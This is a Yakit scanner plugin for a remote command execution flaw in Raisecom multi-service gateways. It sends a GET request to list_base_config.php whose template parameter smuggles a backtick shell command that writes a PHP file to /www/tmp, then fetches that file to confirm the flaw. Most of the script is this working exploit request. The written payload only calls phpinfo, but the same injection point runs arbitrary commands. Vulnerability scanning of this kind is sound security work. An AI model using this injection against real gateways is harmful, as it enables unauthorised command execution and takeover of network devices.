script_name: 瑞斯康达多业务智能网关list_base_config 远程命令执行漏洞
content:
# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3Bunlink%28__FILE__%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Ftest.php%60 HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close

`


    rsp,req,_ = poc.HTTP(packet1,
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )


	packet2 = `GET /tmp/test.php HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close

`


    rsp1,req1,_ = poc.HTTP(packet2,
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )



    if str.MatchAllOfSubString(rsp1, 'HTTP/1.1 200','PHP Version'){
        yakit.Info("%v found 瑞斯康达多业务智能网关list_base_config 远程命令执行漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("瑞斯康达多业务智能网关list_base_config 远程命令执行漏洞"),
        risk.severity("high"),
        risk.titleVerbose("瑞斯康达多业务智能网关list_base_config 远程命令执行漏洞"),
        risk.request(string(req1)),
        risk.response(string(rsp1)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
